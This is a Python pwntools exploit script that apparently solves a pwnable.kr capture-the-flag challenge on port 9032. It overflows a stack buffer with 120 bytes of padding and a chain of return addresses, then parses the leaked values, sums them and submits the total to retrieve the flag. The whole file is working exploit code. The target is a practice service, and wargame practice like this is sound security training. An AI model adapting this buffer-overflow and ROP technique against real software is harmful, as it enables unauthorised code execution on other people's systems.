#!/usr/bin/env python3
from pwn import *

import re

REGEX = re.compile(b"\(EXP \+(?P<number>[\-\d]+)\)")

def num_from_output(output: bytes) -> int:
    return int(REGEX.search(output).groups()[0])

TARGET = 0x809fffc
A = 0x809fe4b
B = 0x809fe6a
C = 0x809fe89
D = 0x809fea8
E = 0x809fec7
F = 0x809fee6
G = 0x809ff05

p = remote("pwnable.kr", 9032)

p.sendline(str(0).encode())

print(p.recvuntil(b"How many EXP did you earned? : "))

payload = b"A" * 120  # pad
payload += p32(A)
payload += p32(B)
payload += p32(C)
payload += p32(D)
payload += p32(E)
payload += p32(F)
payload += p32(G)
payload += p32(TARGET)

p.sendline(payload)

p.recvline()

a = num_from_output(p.recvline())
b = num_from_output(p.recvline())
c = num_from_output(p.recvline())
d = num_from_output(p.recvline())
e = num_from_output(p.recvline())
f = num_from_output(p.recvline())
g = num_from_output(p.recvline())

sum_ = u32(p32((a + b + c + d + e + f + g) % (1 << 32)), sign="signed")

p.sendline(str(0).encode())
p.sendline(str(sum_).encode())

log.info(f"{a=}, {b=}, {c=}, {d=}, {e=}, {f=}, {g=}")
log.info(f"{sum_=}")

p.recvuntil(b"How many EXP did you earned? : ")
log.success(f"flag = '{p.recvline().decode().strip()}'")

